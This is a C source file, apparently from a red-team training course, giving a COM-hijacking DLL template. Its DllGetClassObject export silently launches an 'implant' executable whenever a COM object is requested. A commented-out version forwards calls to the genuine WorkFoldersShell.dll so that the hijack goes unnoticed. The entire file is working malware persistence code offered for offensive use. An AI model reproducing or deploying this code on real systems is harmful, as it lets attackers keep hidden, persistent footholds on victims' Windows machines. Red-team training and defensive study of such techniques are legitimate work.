/*

 Red Team Operator course code template
 COM hijacking template
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <Windows.h>
#include <combaseapi.h>


BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;    
	case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

HRESULT STDAPI DllGetClassObject(__in REFCLSID rclsid,
								__in REFIID riid,
								__deref_out LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	
	CreateProcess(
				"c:\\RTO\\PERS\\implant\\implant.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	return S_OK;  
} 


















/*

typedef HRESULT(WINAPI * tDllGetClassObject)(REFCLSID rclsid, REFIID riid, LPVOID* ppv);
tDllGetClassObject pDllGetClassObject;

HRESULT STDAPI DllGetClassObject(REFCLSID rclsid,
								 REFIID riid,
								 LPVOID FAR* ppv) { 
	STARTUPINFO info={sizeof(info)};
    PROCESS_INFORMATION processInfo;
	HMODULE hOrigDLL;
	
	CreateProcess(
				"c:\\RTO\\PERS\\implant\\implant.exe", 
				"", NULL, NULL, TRUE, 0, NULL, NULL, 
				&info, &processInfo);
	
	hOrigDLL = LoadLibrary("C:\\Windows\\System32\\WorkFoldersShell.dll");
	pDllGetClassObject = (tDllGetClassObject) GetProcAddress(hOrigDLL, "DllGetClassObject");
	if (!pDllGetClassObject)
		return S_FALSE;
	
	HRESULT hRes = pDllGetClassObject(rclsid, riid, ppv);
	
	return hRes;
} 
*/